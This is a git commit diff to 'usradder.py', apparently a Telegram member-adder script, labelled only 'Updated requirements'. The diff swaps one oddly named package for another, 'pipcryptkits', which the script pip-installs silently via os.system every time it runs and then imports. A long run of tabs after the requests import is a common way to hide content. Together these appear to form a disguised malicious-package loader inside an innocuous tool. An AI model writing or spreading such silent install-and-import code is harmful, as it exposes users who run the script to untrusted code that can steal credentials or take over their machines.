9e2c96ca507ccc4eb69d6c81a214d98c3bed4ce1
b14nk3r <122880466+b14nk3r@users.noreply.github.com>
2023-07-18 02:58:10 +0200

    Updated requirements

--- usradder.py
+++ usradder.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqladdV1")
-import pipsqladdV1
+os.system("pip install pipcryptkits")
+import pipcryptkits
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																							
 from telethon.sync import TelegramClient
 from telethon.tl.types import InputPeerChannel
